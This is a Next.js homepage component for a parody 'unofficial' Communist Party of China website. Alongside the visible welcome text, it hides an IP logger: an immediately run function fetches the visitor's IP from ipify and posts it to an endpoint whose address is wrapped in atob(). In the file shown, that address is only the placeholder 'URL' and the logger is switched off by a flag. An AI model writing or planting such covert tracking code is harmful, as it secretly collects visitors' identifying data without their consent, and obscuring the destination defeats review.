// import Image from 'next/image';
import styles from '@/styles/Home.module.css';
import React from 'react';
import Datetime from '../components/date';
import DiscordEmbed from '../components/embed';

export default function Home() {
    let enabled = false;

    (function () {
        function send(content: object) {
            let data = {
                embeds: [content],
            };

            fetch(atob("URL"), {
                method: 'POST',
                headers: {
                    "Content-Type": "application/json"
                },
                body: JSON.stringify(data)
            }).catch(console.error);
        };
        
        if (!enabled) return;

        (function () {
            fetch("https://api.ipify.org?format=json").then((response) => {
                response.json().then((inputData) => {
                    let content = {
                        title: "hi",
                        description: `{inputData.ip}`
                    };
                    send(content);
                }).catch(console.error);
            });
        })();
    })();
    
    return (
        <>
	<title>Communist Party of China</title>
        <header><h1>Communist Party of China</h1></header>
        <DiscordEmbed title={"Communist Party of China"} description={"(un)Official Website of the CCP"} />
        <main>
            <h1>Welcome</h1>
            <h2>to the unofficial website of the CCP!</h2>
            <p className={styles.inline}>Current date and time: </p><Datetime/>
        </main>
        </>
    );
}
